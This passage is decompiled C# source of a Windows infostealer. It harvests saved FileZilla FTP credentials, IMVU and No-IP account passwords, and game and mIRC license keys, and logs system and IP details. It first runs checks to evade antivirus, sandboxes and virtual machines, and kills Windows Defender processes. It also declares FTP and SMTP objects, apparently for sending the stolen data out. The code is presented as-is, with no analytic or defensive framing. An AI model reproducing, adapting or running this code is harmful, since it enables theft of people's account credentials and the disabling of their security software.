					text190 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", string.Empty, "License"));
					goto IL_525a;
					IL_525a:
					num = 1134;
					streamWriter.WriteLine("Mirc (Serial Key) : " + text190);
					goto IL_5274;
					IL_5274:
					num = 1135;
					streamWriter.Flush();
					goto IL_5282;
					IL_5282:
					num = 1136;
					streamWriter.WriteLine(string.Empty);
					goto IL_5295;
					IL_5295:
					num = 1137;
					streamWriter.Flush();
					goto IL_52a3;
					IL_52a3:
					ProjectData.ClearProjectError();
					num3 = -193;
					goto IL_52af;
					IL_52af:
					num = 1139;
					text191 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Orange Box", string.Empty, "ergc"));
					goto IL_52d1;
					IL_52d1:
					num = 1140;
					streamWriter.WriteLine("Orange Box : " + text191);
					goto IL_52eb;
					IL_52eb:
					num = 1141;
					streamWriter.Flush();
					goto IL_52f9;
					IL_52f9:
					num = 1142;
					streamWriter.WriteLine(string.Empty);
					goto IL_530c;
					IL_530c:
					num = 1143;
					streamWriter.Flush();
					goto IL_531a;
					IL_531a:
					ProjectData.ClearProjectError();
					num3 = -194;
					goto IL_5326;
					IL_5326:
					num = 1145;
					text192 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Orange Box", string.Empty, "ergc"));
					goto IL_5348;
					IL_5348:
					num = 1146;
					streamWriter.WriteLine("Orange Box : " + text192);
					goto IL_5362;
					IL_5362:
					num = 1147;
					streamWriter.Flush();
					goto IL_5370;
					IL_5370:
					num = 1148;
					streamWriter.WriteLine(string.Empty);
					goto IL_5383;
					end_IL_0000_2:
					break;
				}
				num = 1151;
				streamWriter.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 26052;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void DeleteShit()
	{
		try
		{
			if (File.Exists(Path.GetTempPath() + "\\melt.tmp"))
			{
				FileSystem.Kill(Path.GetTempPath() + "\\melt.tmp");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (File.Exists(Interaction.Environ("tmp") + "\\TMP.dat"))
			{
				FileSystem.Kill(Interaction.Environ("tmp") + "\\TMP.dat");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void DeleteChromeDLL()
	{
		try
		{
			if (File.Exists(Application.get_StartupPath() + "\\System.Data.SQLite.DLL"))
			{
				FileSystem.Kill(Application.get_StartupPath() + "\\System.Data.SQLite.DLL");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Chromer_Load(object sender, EventArgs e)
	{
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Expected O, but got Unknown
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		//IL_0537: Unknown result type (might be due to invalid IL or missing references)
		//IL_053e: Expected O, but got Unknown
		//IL_06a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b0: Expected O, but got Unknown
		//IL_0c82: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c89: Expected O, but got Unknown
		//IL_0ca5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cac: Expected O, but got Unknown
		//IL_0cc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccf: Expected O, but got Unknown
		//IL_0cf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf8: Expected O, but got Unknown
		//IL_0d14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d1b: Expected O, but got Unknown
		//IL_11c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_11cb: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		byte[] array = default(byte[]);
		Class5 @class = default(Class5);
		RichTextBox val = default(RichTextBox);
		string environmentVariable = default(string);
		StreamReader streamReader = default(StreamReader);
		string strSource = default(string);
		string between = default(string);
		string between2 = default(string);
		string between3 = default(string);
		RichTextBox val2 = default(RichTextBox);
		HttpWebRequest httpWebRequest = default(HttpWebRequest);
		HttpWebResponse httpWebResponse = default(HttpWebResponse);
		Stream responseStream = default(Stream);
		StreamReader streamReader2 = default(StreamReader);
		RichTextBox val3 = default(RichTextBox);
		string hKey = default(string);
		string hKey2 = default(string);
		string text = default(string);
		string data = default(string);
		string text2 = default(string);
		string data2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		RichTextBox val4 = default(RichTextBox);
		StreamReader streamReader3 = default(StreamReader);
		TextBox val5 = default(TextBox);
		TextBox val6 = default(TextBox);
		TextBox val7 = default(TextBox);
		TextBox val8 = default(TextBox);
		TextBox val9 = default(TextBox);
		StreamWriter streamWriter2 = default(StreamWriter);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		int num5 = default(int);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		Random random = default(Random);
		TextBox val10 = default(TextBox);
		FtpWebRequest ftpWebRequest = default(FtpWebRequest);
		StreamWriter streamWriter3 = default(StreamWriter);
		byte[] array2 = default(byte[]);
		Stream requestStream = default(Stream);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		MailMessage mailMessage = default(MailMessage);
		SmtpClient smtpClient = default(SmtpClient);
		string text13 = default(string);
		string text14 = default(string);
		MailMessage mailMessage2 = default(MailMessage);
		Attachment item = default(Attachment);
		SmtpClient smtpClient2 = default(SmtpClient);
		StreamWriter streamWriter4 = default(StreamWriter);
		string text15 = default(string);
		string text16 = default(string);
		string text17 = default(string);
		MailMessage mailMessage3 = default(MailMessage);
		SmtpClient smtpClient3 = default(SmtpClient);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num4;
					string strEnd;
					string strStart;
					int startPos;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						((Control)this).Hide();
						goto IL_0008;
					case 8657:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 2:
									break;
								case 3:
									goto IL_00f3;
								case 4:
									goto IL_010c;
								case 5:
									goto IL_0128;
								case 6:
									goto IL_0138;
								case 7:
									goto IL_036d;
								case 8:
									goto IL_0524;
								case 9:
									goto IL_05e0;
								case 10:
									goto IL_0769;
								case 11:
									goto IL_07a0;
								case 12:
									goto IL_0d5f;
								case 13:
									goto IL_0da1;
								case 14:
									goto IL_0dff;
								case 15:
									goto IL_0eb5;
								case 16:
									goto IL_0f00;
								case 17:
									goto IL_0f56;
								case 18:
									goto IL_0f95;
								case 19:
									goto IL_1033;
								case 20:
									goto IL_1681;
								case 21:
									goto IL_18e4;
								case 22:
									goto IL_1b16;
								case 1:
									goto IL_1c84;
								default:
									goto end_IL_0000;
								}
								goto IL_007d;
							}
							goto IL_1c84;
						}
						IL_1c41:
						num = 329;
						streamWriter.Close();
						goto IL_1c4e;
						IL_1c84:
						num4 = unchecked(num2 + 1);
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0018;
						case 5:
							goto IL_0020;
						case 6:
							goto IL_0029;
						case 7:
							goto IL_0032;
						case 8:
							goto IL_003b;
						case 9:
							goto IL_0044;
						case 10:
							goto IL_004e;
						case 11:
							goto IL_0058;
						case 12:
							goto IL_0061;
						case 13:
							goto IL_006f;
						case 14:
							goto IL_007d;
						case 15:
							goto IL_0086;
						case 16:
						case 19:
						case 20:
							goto IL_009d;
						case 21:
							goto IL_00a4;
						case 22:
							goto IL_00ad;
						case 23:
							goto IL_00ca;
						case 24:
							goto IL_00df;
						case 25:
							goto IL_00f3;
						case 26:
							goto IL_00fa;
						case 27:
							goto IL_0103;
						case 28:
							goto IL_010c;
						case 29:
							goto IL_0113;
						case 30:
							goto IL_011d;
						case 31:
							goto IL_0128;
						case 32:
							goto IL_012f;
						case 33:
							goto IL_0138;
						case 34:
							goto IL_013f;
						case 35:
							goto IL_0149;
						case 36:
							goto IL_0151;
						case 37:
							goto IL_0160;
						case 38:
							goto IL_0168;
						case 39:
							goto IL_0170;
						case 40:
							goto IL_0189;
						case 41:
							goto IL_019f;
						case 42:
							goto IL_01a7;
						case 43:
							goto IL_01b3;
						case 44:
							goto IL_01bb;
						case 45:
							goto IL_01be;
						case 48:
							goto IL_01cb;
						case 49:
							goto IL_01d3;
						case 50:
							goto IL_01f7;
						case 51:
							goto IL_01ff;
						case 52:
							goto IL_0223;
						case 53:
							goto IL_022b;
						case 54:
							goto IL_024f;
						case 55:
							goto IL_0257;
						case 56:
							goto IL_0279;
						case 57:
							goto IL_0281;
						case 58:
							goto IL_02a3;
						case 59:
							goto IL_02ab;
						case 60:
							goto IL_02cd;
						case 61:
							goto IL_02d5;
						case 62:
							goto IL_02f0;
						case 63:
							goto IL_02f8;
						case 46:
						case 47:
						case 64:
							goto IL_0352;
						case 66:
							goto IL_036a;
						case 65:
						case 67:
						case 68:
							goto IL_036d;
						case 69:
							goto IL_0374;
						case 70:
							goto IL_037e;
						case 71:
							goto IL_0392;
						case 72:
							goto IL_03a3;
						case 73:
							goto IL_03af;
						case 74:
							goto IL_03bb;
						case 75:
							goto IL_03ca;
						case 76:
							goto IL_03f1;
						case 77:
							goto IL_0524;
						case 78:
							goto IL_052c;
						case 79:
							goto IL_0534;
						case 80:
							goto IL_053e;
						case 81:
							goto IL_0546;
						case 82:
							goto IL_0550;
						case 83:
							goto IL_0558;
						case 84:
							goto IL_0562;
						case 85:
							goto IL_057d;
						case 86:
							goto IL_05e0;
						case 87:
							goto IL_05e8;
						case 88:
							goto IL_060c;
						case 89:
							goto IL_0630;
						case 90:
							goto IL_0654;
						case 91:
							goto IL_0678;
						case 92:
							goto IL_069c;
						case 93:
							goto IL_06a6;
						case 94:
							goto IL_06b0;
						case 95:
							goto IL_0769;
						case 96:
							goto IL_0771;
						case 97:
							goto IL_077a;
						case 98:
							goto IL_0782;
						case 99:
							goto IL_07a0;
						case 100:
							goto IL_07b3;
						case 101:
							goto IL_07c8;
						case 102:
							goto IL_07dd;
						case 103:
							goto IL_07f2;
						case 104:
							goto IL_0807;
						case 105:
							goto IL_081c;
						case 106:
							goto IL_0831;
						case 107:
							goto IL_0846;
						case 108:
							goto IL_085b;
						case 109:
							goto IL_0870;
						case 110:
							goto IL_0885;
						case 111:
							goto IL_089a;
						case 112:
							goto IL_08af;
						case 113:
							goto IL_08c4;
						case 114:
							goto IL_08d9;
						case 115:
							goto IL_08ee;
						case 116:
							goto IL_0903;
						case 117:
							goto IL_0918;
						case 118:
							goto IL_092d;
						case 119:
							goto IL_0942;
						case 120:
							goto IL_0957;
						case 121:
							goto IL_096c;
						case 122:
							goto IL_0981;
						case 123:
							goto IL_099a;
						case 124:
							goto IL_09b3;
						case 125:
							goto IL_09cc;
						case 126:
							goto IL_09e5;
						case 127:
							goto IL_09fe;
						case 128:
							goto IL_0a17;
						case 129:
							goto IL_0a33;
						case 130:
							goto IL_0a4f;
						case 131:
							goto IL_0a6b;
						case 132:
							goto IL_0a87;
						case 133:
							goto IL_0aa3;
						case 134:
							goto IL_0abf;
						case 135:
							goto IL_0adb;
						case 136:
							goto IL_0af7;
						case 137:
							goto IL_0b13;
						case 138:
							goto IL_0b2f;
						case 139:
							goto IL_0b4b;
						case 140:
							goto IL_0b67;
						case 141:
							goto IL_0b83;
						case 142:
							goto IL_0b9f;
						case 143:
							goto IL_0bbb;
						case 144:
							goto IL_0bd7;
						case 145:
							goto IL_0bee;
						case 146:
							goto IL_0c0c;
						case 147:
							goto IL_0c25;
						case 148:
							goto IL_0c3e;
						case 149:
							goto IL_0c57;
						case 150:
							goto IL_0c71;
						case 151:
							goto IL_0c7c;
						case 152:
							goto IL_0c89;
						case 153:
							goto IL_0c9f;
						case 154:
							goto IL_0cac;
						case 155:
							goto IL_0cc2;
						case 156:
							goto IL_0ccf;
						case 157:
							goto IL_0ceb;
						case 158:
							goto IL_0cf8;
						case 159:
							goto IL_0d0e;
						case 160:
							goto IL_0d1b;
						case 161:
							goto IL_0d31;
						case 163:
							goto IL_0d46;
						case 164:
							goto IL_0d4c;
						case 165:
							goto IL_0d54;
						case 166:
							goto IL_0d5f;
						case 162:
						case 167:
						case 168:
							goto IL_0d73;
						case 169:
							goto IL_0d7b;
						case 171:
							goto IL_0d90;
						case 172:
							goto IL_0d96;
						case 170:
						case 173:
						case 174:
							goto IL_0da1;
						case 175:
							goto IL_0da9;
						case 177:
							goto IL_0dbe;
						case 178:
							goto IL_0dc4;
						case 179:
							goto IL_0de0;
						case 180:
							goto IL_0df2;
						case 176:
						case 181:
						case 182:
							goto IL_0dff;
						case 183:
							goto IL_0e20;
						case 184:
							goto IL_0e2c;
						case 185:
							goto IL_0e34;
						case 186:
							goto IL_0e49;
						case 187:
							goto IL_0e60;
						case 188:
							goto IL_0e7e;
						case 189:
							goto IL_0e91;
						case 191:
							goto IL_0eaf;
						case 190:
						case 192:
						case 193:
							goto IL_0eb5;
						case 194:
							goto IL_0ebd;
						case 195:
							goto IL_0ed2;
						case 197:
							goto IL_0efa;
						case 196:
						case 198:
						case 199:
							goto IL_0f00;
						case 200:
							goto IL_0f0a;
						case 201:
							goto IL_0f12;
						case 202:
							goto IL_0f28;
						case 204:
							goto IL_0f50;
						case 203:
						case 205:
						case 206:
							goto IL_0f56;
						case 207:
							goto IL_0f63;
						case 208:
							goto IL_0f6b;
						case 209:
							goto IL_0f81;
						case 211:
							goto IL_0f8f;
						case 210:
						case 212:
						case 213:
							goto IL_0f95;
						case 214:
							goto IL_0fa2;
						case 215:
							goto IL_0faa;
						case 216:
							goto IL_0fc0;
						case 217:
							goto IL_0fd6;
						case 218:
							goto IL_0fe7;
						case 219:
							goto IL_1008;
						case 220:
							goto IL_101a;
						case 222:
							goto IL_102d;
						case 221:
						case 223:
						case 224:
							goto IL_1033;
						case 225:
							goto IL_1049;
						case 227:
							goto IL_1057;
						case 226:
						case 228:
						case 229:
							goto IL_105d;
						case 230:
							goto IL_1078;
						case 232:
							goto IL_108c;
						case 231:
						case 233:
						case 234:
							goto IL_1092;
						case 235:
							goto IL_109f;
						case 236:
							goto IL_10c0;
						case 238:
							goto IL_10cf;
						case 239:
							goto IL_10d5;
						case 237:
						case 240:
						case 241:
							goto IL_10e2;
						case 242:
							goto IL_10fb;
						case 243:
							goto IL_111e;
						case 244:
							goto IL_1141;
						case 245:
							goto IL_1164;
						case 246:
							goto IL_11b1;
						case 247:
							goto IL_11be;
						case 248:
							goto IL_11cb;
						case 249:
							goto IL_11ed;
						case 250:
							goto IL_124e;
						case 251:
							goto IL_127a;
						case 252:
							goto IL_128c;
						case 253:
							goto IL_12a8;
						case 254:
							goto IL_13cb;
						case 255:
							goto IL_13d8;
						case 256:
							goto IL_13e5;
						case 257:
							goto IL_1401;
						case 258:
							goto IL_1410;
						case 259:
							goto IL_1424;
						case 260:
							goto IL_1431;
						case 261:
							goto IL_143e;
						case 262:
						case 263:
							goto IL_1458;
						case 264:
							goto IL_1460;
						case 265:
							goto IL_1473;
						case 266:
							goto IL_1486;
						case 267:
							goto IL_1499;
						case 268:
							goto IL_14a6;
						case 269:
							goto IL_14c0;
						case 270:
							goto IL_14da;
						case 271:
							goto IL_14fb;
						case 272:
							goto IL_161e;
						case 273:
							goto IL_1630;
						case 274:
							goto IL_1642;
						case 275:
							goto IL_1664;
						case 276:
							goto IL_1672;
						case 277:
							goto IL_1681;
						case 278:
							goto IL_16a1;
						case 279:
							goto IL_16a9;
						case 280:
							goto IL_16bc;
						case 281:
							goto IL_16cf;
						case 282:
							goto IL_16e1;
						case 283:
							goto IL_16ee;
						case 284:
							goto IL_1708;
						case 285:
							goto IL_1720;
						case 286:
							goto IL_173a;
						case 287:
							goto IL_175b;
						case 288:
							goto IL_176d;
						case 289:
							goto IL_1781;
						case 290:
							goto IL_1793;
						case 291:
							goto IL_17a5;
						case 292:
							goto IL_17c7;
						case 293:
							goto IL_17d5;
						case 294:
							goto IL_17e4;
						case 295:
							goto IL_1800;
						case 296:
							goto IL_1812;
						case 297:
							goto IL_1824;
						case 298:
							goto IL_1840;
						case 299:
							goto IL_1878;
						case 300:
							goto IL_189a;
						case 301:
							goto IL_18ac;
						case 302:
							goto IL_18b9;
						case 303:
							goto IL_18c6;
						case 304:
						case 305:
							goto IL_18e4;
						case 306:
							goto IL_18ec;
						case 307:
							goto IL_18ff;
						case 308:
							goto IL_1912;
						case 309:
							goto IL_1925;
						case 310:
							goto IL_1932;
						case 311:
							goto IL_194c;
						case 312:
							goto IL_1966;
						case 313:
							goto IL_1987;
						case 314:
							goto IL_1aaa;
						case 315:
							goto IL_1abe;
						case 316:
							goto IL_1ad7;
						case 317:
							goto IL_1af9;
						case 318:
							goto IL_1b07;
						case 319:
							goto IL_1b16;
						case 320:
							goto IL_1b35;
						case 321:
							goto IL_1b51;
						case 322:
							goto IL_1b63;
						case 323:
							goto IL_1b75;
						case 324:
							goto IL_1b91;
						case 325:
							goto IL_1bc9;
						case 326:
							goto IL_1c01;
						case 327:
							goto IL_1c22;
						case 328:
							goto IL_1c34;
						case 329:
							goto IL_1c41;
						case 330:
							goto IL_1c4e;
						case 332:
							goto IL_1c71;
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 331:
						case 333:
						case 334:
							goto end_IL_0000_3;
						}
						goto default;
						IL_0008:
						ProjectData.ClearProjectError();
						num3 = 2;
						goto IL_000f;
						IL_000f:
						num = 3;
						antiKAV();
						goto IL_0018;
						IL_0018:
						num = 4;
						method_1();
						goto IL_0020;
						IL_0020:
						num = 5;
						antiSandboxie();
						goto IL_0029;
						IL_0029:
						num = 6;
						antiAnubis();
						goto IL_0032;
						IL_0032:
						num = 7;
						antiAnubis2();
						goto IL_003b;
						IL_003b:
						num = 8;
						AntiVirtualBox();
						goto IL_0044;
						IL_0044:
						num = 9;
						AntiVmWare();
						goto IL_004e;
						IL_004e:
						num = 10;
						AntiVirtualPC();
						goto IL_0058;
						IL_0058:
						num = 11;
						method_2();
						goto IL_0061;
						IL_0061:
						num = 12;
						seekanddestroy("MSASCui");
						goto IL_006f;
						IL_006f:
						num = 13;
						seekanddestroy("msmpeng");
						goto IL_007d;
						IL_007d:
						num = 14;
						DeleteShit();
						goto IL_0086;
						IL_0086:
						num = 15;
						if (!((ServerComputer)Class1.smethod_0()).get_Network().get_IsAvailable())
						{
							break;
						}
						goto IL_009d;
						IL_009d:
						ProjectData.ClearProjectError();
						num3 = 3;
						goto IL_00a4;
						IL_00a4:
						num = 21;
						array = Class6.smethod_3();
						goto IL_00ad;
						IL_00ad:
						num = 22;
						FileSystem.FileOpen(1, Application.get_StartupPath() + "\\System.Data.SQLite.DLL", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						goto IL_00ca;
						IL_00ca:
						num = 23;
						FileSystem.FilePut(1, (Array)array, -1L, false, false);
						goto IL_00df;
						IL_00df:
						num = 24;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_00f3;
						IL_00f3:
						ProjectData.ClearProjectError();
						num3 = 4;
						goto IL_00fa;
						IL_00fa:
						num = 26;
						GetChrome();
						goto IL_0103;
						IL_0103:
						num = 27;
						DeleteChromeDLL();
						goto IL_010c;
						IL_010c:
						ProjectData.ClearProjectError();
						num3 = 5;
						goto IL_0113;
						IL_0113:
						num = 29;
						@class = new Class5();
						goto IL_011d;
						IL_011d:
						num = 30;
						@class.method_5();
						goto IL_0128;
						IL_0128:
						ProjectData.ClearProjectError();
						num3 = 6;
						goto IL_012f;
						IL_012f:
						num = 32;
						MSN();
						goto IL_0138;
						IL_0138:
						ProjectData.ClearProjectError();
						num3 = 7;
						goto IL_013f;
						IL_013f:
						num = 34;
						val = new RichTextBox();
						goto IL_0149;
						IL_0149:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0151;
						IL_0151:
						num = 36;
						environmentVariable = Environment.GetEnvironmentVariable("APPDATA");
						goto IL_0160;
						IL_0160:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_0168;
						IL_0168:
						ProjectData.ClearProjectError();
						num3 = -4;
						goto IL_0170;
						IL_0170:
						num = 39;
						if (File.Exists(environmentVariable + "\\FileZilla\\filezilla.xml"))
						{
							goto IL_0189;
						}
						goto IL_036a;
						IL_0189:
						num = 40;
						streamReader = new StreamReader(environmentVariable + "\\FileZilla\\filezilla.xml");
						goto IL_019f;
						IL_019f:
						ProjectData.ClearProjectError();
						num3 = -5;
						goto IL_01a7;
						IL_01a7:
						num = 42;
						strSource = streamReader.ReadToEnd();
						goto IL_01b3;
						IL_01b3:
						ProjectData.ClearProjectError();
						num3 = -6;
						goto IL_01bb;
						IL_01bb:
						num = 44;
						goto IL_01be;
						IL_01be:
						ProjectData.ClearProjectError();
						num3 = -7;
						goto IL_0352;
						IL_0352:
						num = 47;
						if (Strings.InStr(strSource, "<Host>", (CompareMethod)0) != 0)
						{
							goto IL_01cb;
						}
						goto IL_036d;
						IL_01cb:
						ProjectData.ClearProjectError();
						num3 = -8;
						goto IL_01d3;
						IL_01d3:
						num = 49;
						strStart = "<User>";
						strEnd = "</User>";
						startPos = 0;
						between = GetBetween(ref strSource, ref strStart, ref strEnd, ref startPos);
						goto IL_01f7;
						IL_01f7:
						ProjectData.ClearProjectError();
						num3 = -9;
						goto IL_01ff;
						IL_01ff:
						num = 51;
						strEnd = "<Pass>";
						strStart = "</Pass>";
						startPos = 0;
						between2 = GetBetween(ref strSource, ref strEnd, ref strStart, ref startPos);
						goto IL_0223;
						IL_0223:
						ProjectData.ClearProjectError();
						num3 = -10;
						goto IL_022b;
						IL_022b:
						num = 53;
						strEnd = "<Host>";
						strStart = "</Host>";
						startPos = 0;
						between3 = GetBetween(ref strSource, ref strEnd, ref strStart, ref startPos);
						goto IL_024f;
						IL_024f:
						ProjectData.ClearProjectError();
						num3 = -11;
						goto IL_0257;
						IL_0257:
						num = 55;
						strSource = strSource.Replace("<User>" + between + "</User>", string.Empty);
						goto IL_0279;
						IL_0279:
						ProjectData.ClearProjectError();
						num3 = -12;
						goto IL_0281;
						IL_0281:
						num = 57;
						strSource = strSource.Replace("<Pass>" + between2 + "</Pass>", string.Empty);
						goto IL_02a3;
						IL_02a3:
						ProjectData.ClearProjectError();
						num3 = -13;
						goto IL_02ab;
						IL_02ab:
						num = 59;
						strSource = strSource.Replace("<Host>" + between3 + "</Host>", string.Empty);
						goto IL_02cd;
						IL_02cd:
						ProjectData.ClearProjectError();
						num3 = -14;
						goto IL_02d5;
						IL_02d5:
						num = 61;
						val.set_Text(val.get_Text() + "=FileZilla Steal=\r\n");
						goto IL_02f0;
						IL_02f0:
						ProjectData.ClearProjectError();
						num3 = -15;
						goto IL_02f8;
						IL_02f8:
						num = 63;
						val.set_Text(val.get_Text() + "Host : " + between3 + "\r\nUsername : " + between + "\r\nPassword : " + between2 + "\r\n");
						goto IL_0352;
						IL_036a:
						num = 66;
						goto IL_036d;
						IL_036d:
						ProjectData.ClearProjectError();
						num3 = 8;
						goto IL_0374;
						IL_0374:
						num = 69;
						val2 = new RichTextBox();
						goto IL_037e;
						IL_037e:
						num = 70;
						httpWebRequest = (HttpWebRequest)WebRequest.Create("http://whatismyip.com/automation/n09230945.asp");
						goto IL_0392;
						IL_0392:
						num = 71;
						httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
						goto IL_03a3;
						IL_03a3:
						num = 72;
						responseStream = httpWebResponse.GetResponseStream();
						goto IL_03af;
						IL_03af:
						num = 73;
						streamReader2 = new StreamReader(responseStream);
						goto IL_03bb;
						IL_03bb:
						num = 74;
						val2.set_Text("=PC Info Steal=\r\n");
						goto IL_03ca;
						IL_03ca:
						num = 75;
						val2.set_Text(val2.get_Text() + "IP: " + streamReader2.ReadToEnd() + "\r\n");
						goto IL_03f1;
						IL_03f1:
						num = 76;
						val2.set_Text(val2.get_Text() + "Operating System Name : " + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName().ToString() + "\r\nComputer Name : " + Environment.MachineName.ToString() + "\r\nComputer User Name : " + Environment.UserName.ToString() + "\r\nMain System Directory Location : " + Environment.SystemDirectory.ToString() + "\r\nComputer's been running for : " + Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5) + " Hours\r\nPhisical Memory Available : " + (double)((ServerComputer)Class1.smethod_0()).get_Info().get_TotalPhysicalMemory() / 1048576.0 + " MB\r\nLanguage : " + ((ServerComputer)Class1.smethod_0()).get_Info().get_InstalledUICulture().ToString() + "\r\nLocal Time : " + ((ServerComputer)Class1.smethod_0()).get_Clock().get_LocalTime());
						goto IL_0524;
						IL_0524:
						ProjectData.ClearProjectError();
						num3 = 9;
						goto IL_052c;
						IL_052c:
						ProjectData.ClearProjectError();
						num3 = -16;
						goto IL_0534;
						IL_0534:
						num = 79;
						val3 = new RichTextBox();
						goto IL_053e;
						IL_053e:
						ProjectData.ClearProjectError();
						num3 = -17;
						goto IL_0546;
						IL_0546:
						num = 81;
						hKey = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
						goto IL_0550;
						IL_0550:
						ProjectData.ClearProjectError();
						num3 = -18;
						goto IL_0558;
						IL_0558:
						num = 83;
						hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
						goto IL_0562;
						IL_0562:
						num = 84;
						val3.set_Text(val3.get_Text() + "=IMVU Steal=\r\n");
						goto IL_057d;
						IL_057d:
						num = 85;
						val3.set_Text(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)(val3.get_Text() + "Username : "), ReadKey(ref hKey)), (object)"\r\n"), (object)"Password : "), (object)Hex2Ascii(Conversions.ToString(ReadKey(ref hKey2)))), (object)"\r\n")));
						goto IL_05e0;
						IL_05e0:
						ProjectData.ClearProjectError();
						num3 = 10;
						goto IL_05e8;
						IL_05e8:
						num = 87;
						text = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
						goto IL_060c;
						IL_060c:
						num = 88;
						data = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
						goto IL_0630;
						IL_0630:
						num = 89;
						text2 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
						goto IL_0654;
						IL_0654:
						num = 90;
						data2 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
						goto IL_0678;
						IL_0678:
						num = 91;
						text3 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
						goto IL_069c;
						IL_069c:
						num = 92;
						text4 = "\r\n";
						goto IL_06a6;
						IL_06a6:
						num = 93;
						val4 = new RichTextBox();
						goto IL_06b0;
						IL_06b0:
						num = 94;
						val4.set_Text(val4.get_Text() + "=No IP Steal=" + text4 + "Username: " + text + text4 + "Password: " + base64Decode(data) + text4 + "Proxy Username:" + text2 + text4 + "Proxy Password: " + base64Decode(data2) + text4 + "Proxy Port: " + text3 + text4 + text4);
						goto IL_0769;
						IL_0769:
						ProjectData.ClearProjectError();
						num3 = -19;
						goto IL_0771;
						IL_0771:
						num = 96;
						Key();
						goto IL_077a;
						IL_077a:
						ProjectData.ClearProjectError();
						num3 = 11;
						goto IL_0782;
						IL_0782:
						num = 98;
						streamReader3 = new StreamReader(Interaction.Environ("tmp") + "\\TMP.dat");
						goto IL_07a0;
						IL_07a0:
						num = 99;
						FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						goto IL_07b3;
						IL_07b3:
						num = 100;
						string_1 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_07c8;
						IL_07c8:
						num = 101;
						string_2 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_07dd;
						IL_07dd:
						num = 102;
						string_3 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_07f2;
						IL_07f2:
						num = 103;
						string_4 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0807;
						IL_0807:
						num = 104;
						string_5 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_081c;
						IL_081c:
						num = 105;
						string_6 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0831;
						IL_0831:
						num = 106;
						string_7 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0846;
						IL_0846:
						num = 107;
						string_8 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_085b;
						IL_085b:
						num = 108;
						string_9 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0870;
						IL_0870:
						num = 109;
